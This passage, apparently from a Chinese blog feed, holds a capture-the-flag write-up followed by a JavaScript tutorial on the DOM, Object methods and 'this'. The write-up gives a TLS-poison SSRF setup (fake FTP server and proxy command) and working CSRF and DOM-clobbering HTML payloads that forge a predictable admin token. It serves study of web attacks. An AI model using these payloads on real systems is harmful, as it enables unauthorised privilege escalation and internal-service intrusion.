7\r\n'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>data <span class="token operator">=</span> self<span class="token punctuation">.</span>rfile<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>data<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">b'125 Data connection already open. Transfer starting.\r\n'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>data <span class="token operator">=</span> self<span class="token punctuation">.</span>rfile<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>data<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">b'250 Requested file action okay, completed.'</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"DIE....."</span><span class="token punctuation">)</span>        <span class="token comment"># exit()</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"使用端口:"</span><span class="token punctuation">,</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">with</span> socketserver<span class="token punctuation">.</span>TCPServer<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> MyTCPHandler<span class="token punctuation">)</span> <span class="token keyword">as</span> server<span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"start..."</span><span class="token punctuation">)</span>        server<span class="token punctuation">.</span>handle_request<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"stop"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"OK"</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"END...."</span><span class="token punctuation">)</span>        <span class="token comment"># exit()</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首先启动TLS的代理服务器，使用<span class="exturl"><a class="exturl__link"   href="https://github.com/ZeddYu/TLS-poison/" >工具</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>设置好了之后，导入证书私钥通过一下命令打开代理</p><pre class="line-numbers language-none"><code class="language-none">TLS-poison&#x2F;client-hello-poisoning&#x2F;custom-tls&#x2F;target&#x2F;debug&#x2F;custom-tls -p 11211 --certs &#x2F;home&#x2F;ubuntu&#x2F;tls&#x2F;fullchain.pem --key &#x2F;home&#x2F;ubuntu&#x2F;tls&#x2F;privkey.pem forward 2048<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>此时我们发往11211端口的带TLS的请求就会被解密并转发到2048端口，由于这个工具通过读取redis中的payload来传输数据，所以我们要先将payload存入redis，然后让受害者对我们服务器的11211端口发起FTPS请求，此时我们伪造的服务器会让受害者的服务器到127.0.0.1:11200去获取ftp传输的数据，进行TLS复用，数据被注入</p><p><del>后面就是赛后复盘的了</del></p>        <h2 id="beWhatYouWannaBe"   >          <a href="#beWhatYouWannaBe" class="heading-link"><i class="fas fa-link"></i></a><a href="#beWhatYouWannaBe" class="headerlink" title="beWhatYouWannaBe"></a>beWhatYouWannaBe</h2>      <p>首先P1通过CSRF获取admin，并且此处的Token值可计算</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token function-variable function">ValidateToken</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">Token</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> sha256 <span class="token operator">=</span> crypto<span class="token punctuation">.</span><span class="token function">createHash</span><span class="token punctuation">(</span><span class="token string">'sha256'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> sha256<span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">sin</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span>Date<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">digest</span><span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span> <span class="token operator">===</span> Token<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/beAdmin'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user <span class="token operator">!=</span> <span class="token string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"sorry, only admin can be admin"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">const</span> username <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>username    <span class="token keyword">const</span> csrftoken <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>csrftoken    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ValidateToken</span><span class="token punctuation">(</span>csrftoken<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        User<span class="token punctuation">.</span><span class="token function">updateMany</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">username</span><span class="token operator">:</span> username <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">isAdmin</span><span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            <span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> users</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'something error when being admin'</span><span class="token punctuation">)</span>                    <span class="token keyword">return</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>users<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'no one can be admin'</span><span class="token punctuation">)</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'wow success wow'</span><span class="token punctuation">)</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'validate error'</span><span class="token punctuation">)</span><span class="token number">3</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>获取P1的js构造如下</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>form<span class="token punctuation">"</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://localhost:8000/beAdmin<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>J1an<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>csrftoken<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>csrftoken<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://cdn.jsdelivr.net/npm/crypto-js@4.0.0/crypto-js.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">  <span class="token keyword">var</span> a<span class="token operator">=</span>CryptoJS<span class="token punctuation">.</span><span class="token constant">SHA256</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">sin</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span>Date<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> csrftoken<span class="token punctuation">.</span>value<span class="token operator">=</span>a<span class="token punctuation">;</span>  form<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>再来看P2</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">setJavaScriptEnabled</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">goto</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">timeout</span><span class="token operator">:</span> <span class="token number">5000</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">const</span> data <span class="token operator">=</span> <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">evaluate</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">url<span class="token punctuation">,</span> <span class="token constant">FLAG</span></span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>fff<span class="token punctuation">.</span>lll<span class="token punctuation">.</span>aaa<span class="token punctuation">.</span>ggg<span class="token punctuation">.</span>value <span class="token operator">==</span> <span class="token string">"this_is_what_i_want"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">fetch</span><span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">'?part2='</span> <span class="token operator">+</span> <span class="token function">btoa</span><span class="token punctuation">(</span><span class="token function">encodeURIComponent</span><span class="token punctuation">(</span><span class="token constant">FLAG</span><span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">fetch</span><span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">'?there_is_no_flag'</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> <span class="token constant">FLAG</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>说白了就是构造一个html使得<code>fff.lll.aaa.ggg.value == &quot;this_is_what_i_want&quot;</code>，使用<span class="exturl"><a class="exturl__link"   href="https://portswigger.net/research/dom-clobbering-strikes-back" >这个</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>小trick来嵌套构造元素，最终两者拼接构造出的html如下</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>fff</span> <span class="token attr-name">srcdoc</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&lt;form id=lll name=aaa>&lt;input name=ggg value=this_is_what_i_want>&lt;/form>&lt;form id=lll>&lt;/form><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>form<span class="token punctuation">"</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://localhost:8000/beAdmin<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>J1an<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>csrftoken<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>csrftoken<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://cdn.jsdelivr.net/npm/crypto-js@4.0.0/crypto-js.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">  <span class="token keyword">var</span> a<span class="token operator">=</span>CryptoJS<span class="token punctuation">.</span><span class="token constant">SHA256</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">sin</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span>Date<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> csrftoken<span class="token punctuation">.</span>value<span class="token operator">=</span>a<span class="token punctuation">;</span>  form<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>        <h2 id="poorui"   >          <a href="#poorui" class="heading-link"><i class="fas fa-link"></i></a><a href="#poorui" class="headerlink" title="poorui"></a>poorui</h2>      <p>基本全是非预期吧，登录flag去找flagbot要就行了ss</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript与Nodejs</title>
      <link href="/posts/8f3824ff.html"/>
      <url>/posts/8f3824ff.html</url>
      
        <content type="html"><![CDATA[<p>从头开始了属于是</p><p><strong>BOM</strong></p><ul><li>浏览器对象模型</li><li>javascript将浏览器的各个组成部分封装成对象<ul><li>Window：浏览器窗口对象</li><li>Navigator：浏览器对象</li><li>Screen：屏幕对象</li><li>History：历史记录对象<ul><li>history.back()后退</li><li>history.forward()前进</li></ul></li><li>Location：地址栏对象<ul><li>location.href()设置或返回完整URL</li></ul></li></ul></li></ul><p><strong>DOM</strong></p><ul><li>文档对象模型</li><li>将标记语言的各个部分封装成对象<ul><li>Document：整个文档对象</li><li>Element：元素对象</li><li>Attribute：属性对象</li><li>Text：文本对象</li><li>Comment：注释对象</li><li></li></ul></li></ul>        <h2 id="Object"   >          <a href="#Object" class="heading-link"><i class="fas fa-link"></i></a><a href="#Object" class="headerlink" title="Object"></a>Object</h2>              <h3 id="静态方法"   >          <a href="#静态方法" class="heading-link"><i class="fas fa-link"></i></a><a href="#静态方法" class="headerlink" title="静态方法"></a>静态方法</h3>      <p><strong>（1）对象属性模型的相关方法</strong></p><ul><li><code>Object.getOwnPropertyDescriptor()</code>：获取某个属性的描述对象。</li><li><code>Object.defineProperty()</code>：通过描述对象，定义某个属性。</li><li><code>Object.defineProperties()</code>：通过描述对象，定义多个属性。</li></ul><p><strong>（2）控制对象状态的方法</strong></p><ul><li><code>Object.preventExtensions()</code>：防止对象扩展。</li><li><code>Object.isExtensible()</code>：判断对象是否可扩展。</li><li><code>Object.seal()</code>：禁止对象配置。</li><li><code>Object.isSealed()</code>：判断一个对象是否可配置。</li><li><code>Object.freeze()</code>：冻结一个对象。</li><li><code>Object.isFrozen()</code>：判断一个对象是否被冻结。</li></ul><p><strong>（3）原型链相关方法</strong></p><ul><li><code>Object.create()</code>：该方法可以指定原型对象和属性，返回一个新的对象。</li><li><code>Object.getPrototypeOf()</code>：获取对象的<code>Prototype</code>对象。</li></ul>        <h3 id="实例方法"   >          <a href="#实例方法" class="heading-link"><i class="fas fa-link"></i></a><a href="#实例方法" class="headerlink" title="实例方法"></a>实例方法</h3>      <p>除了静态方法，还有不少方法定义在<code>Object.prototype</code>对象。它们称为实例方法，所有<code>Object</code>的实例对象都继承了这些方法。</p><p><code>Object</code>实例对象的方法，主要有以下六个。</p><ul><li><code>Object.prototype.valueOf()</code>：返回当前对象对应的值。</li><li><code>Object.prototype.toString()</code>：返回当前对象对应的字符串形式。</li><li><code>Object.prototype.toLocaleString()</code>：返回当前对象对应的本地字符串形式。</li><li><code>Object.prototype.hasOwnProperty()</code>：判断某个属性是否为当前对象自身的属性，还是继承自原型对象的属性。</li><li><code>Object.prototype.isPrototypeOf()</code>：判断当前对象是否为另一个对象的原型。</li><li><code>Object.prototype.propertyIsEnumerable()</code>：判断某个属性是否可枚举。</li></ul><p>本节介绍前四个方法，另外两个方法将在后文相关章节介绍。</p>        <h3 id="面向对象"   >          <a href="#面向对象" class="heading-link"><i class="fas fa-link"></i></a><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h3>              <h3 id="this"   >          <a href="#this" class="heading-link"><i class="fas fa-link"></i></a><a href="#this" class="headerlink" title="this"></a>this</h3>      <p>简单说，<code>this</code>就是属性或方法“当前”所在的对象。在全局环境下默认<code>this</code>就是整个<code>window</code>对象，</p><p><code>this</code>主要有以下几个使用场合。</p><p><strong>（1）全局环境</strong></p><p>全局环境使用<code>this</code>，它指的就是顶层对象<code>window</code>。</p><pre class="line-numbers language-none"><code class="language-none">this &#x3D;&#x3D;&#x3D; window &#x2F;&#x2F; truefunction f() &#123;  console.log(this &#x3D;&#x3D;&#x3D; window);&#125;f() &#x2F;&#x2F; true<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面代码说明，不管是不是在函数内部，只要是在全局环境下运行，<code>this</code>就是指顶层对象<code>window</code>。</p><p><strong>（2）构造函数</strong></p><p>构造函数中的<code>this</code>，指的是实例对象。</p><pre class="line-numbers language-none"><code class="language-none">var Obj &#x3D; function (p) &#123;  this.p &#x3D; p;&#125;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>上面代码定义了一个构造函数<code>Obj</code>。由于<code>this</code>指向实例对象，所以在构造函数内部定义<code>this.p</code>，就相当于定义实例对象有一个<code>p</code>属性。</p><pre class="line-numbers language-none"><code class="language-none">var o &#x3D; new Obj(&#39;Hello World!&#39;);o.p &#x2F;&#x2F; &quot;Hello World!&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>（3）对象的方法</strong></p><p>如果对象的方法里面包含<code>this</code>，<code>this</code>的指向就是方法运行时所在的对象。该方法赋值给另一个对象，就会改变<code>this</code>的指向。</p><p>但是，这条规则很不容易把握。请看下面的代码。</p><pre class="line-numbers language-none"><code class="language-none">var obj &#x3D;&#123;  foo: function () &#123;    console.log(this);  &#125;&#125;;obj.foo() &#x2F;&#x2F; obj<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面代码中，<code>obj.foo</code>方法执行时，它内部的<code>this</code>指向<code>obj</code>。</p><p>但是，下面这几种用法，都会改变<code>this</code>的指向。</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; 情况一(obj.foo &#x3D; obj.foo)() &#x2F;&#x2F; window&#x2F;&#x2F; 情况二(false || obj.foo)() &#x2F;&#x2F; window&#x2F;&#x2F; 情况三(1, obj.foo)() &#x2F;&#x2F; window<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面代码中，<code>obj.foo</code>就是一个值。这个值真正调用的时候，运行环境已经不是<code>obj</code>了，而是全局环境，所以<code>this</code>不再指向<code>obj</code>。</p><p>可以这样理解，JavaScript 引擎内部，<code>obj</code>和<code>obj.foo</code>储存在两个内存地址，称为地址一和地址二。<code>obj.foo()</code>这样调用时，是从地址一调用地址二，因此地址二的运行环境是地址一，<code>this</code>指向<code>obj</code>。但是，上面三种情况，都是直接取出地址二进行调用，这样的话，运行环境就是全局环境，因此<code>this</code>指向全局环境。上面三种情况等同于下面的代码。</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; 情况一(obj.foo &#x3D; function () &#123;  console.log(this);&#125;)()&#x2F;&#x2F; 等同于(function () &#123;  console.log(this);&#125;)()&#x2F;&#x2F; 情况二(false || function () &#123;  console.log(this);&#125;)()&#x2F;&#x2F; 情况三(1, function () &#123;  console.log(this);&#125;)()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果<code>this</code>所在的方法不在对象的第一层，这时<code>this</code>只是指向当前一层的对象，而不会继承更上面的层。</p><pre class="line-numbers language-none"><code class="language-none">var a &#x3D; &#123;  p: &#39;Hello&#39;,  b: &#123;    m: function() &#123;      console.log(this.p);    &#125;  &#125;&#125;;a.b.m() &#x2F;&#x2F; undefined<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面代码中，<code>a.b.m</code>方法在<code>a</code>对象的第二层，该方法内部的<code>this</code>不是指向<code>a</code>，而是指向<code>a.b</code>，因为实际执行的是下面的代码。</p><pre class="line-numbers language-none"><code class="language-none">var b &#x3D; &#123;  m: function() &#123;   console.log(this.p);  &#125;&#125;;var a &#x3D; &#123;  p: &#39;Hello&#39;,  b: b&#125;;(a.b).m() &#x2F;&#x2F; 等同于 b.m()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果要达到预期效果，只有写成下面这样。</p><pre class="line-numbers language-none"><code class="language-none">var a &#x3D; &#123;  b: &#123;    m: function() &#123;      console.log(this.p);    &#125;,    p: &#39;Hello&#39;  &#125;&#125;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果这时将嵌套对象内部的方法赋值给一个变量，<code>this</code>依然会指向全局对象。</p><pre class="line-numbers language-none"><code class="language-none">var a &#x3D; &#123;  b: &#123;    m: function() &#123;      console.log(this.p);    &#125;,    p: &#39;Hello&#39;  &#125;&#125;;var hello &#x3D; a.b.m;hello() &#x2F;&#x2F; undefined<span aria-hidden="true" 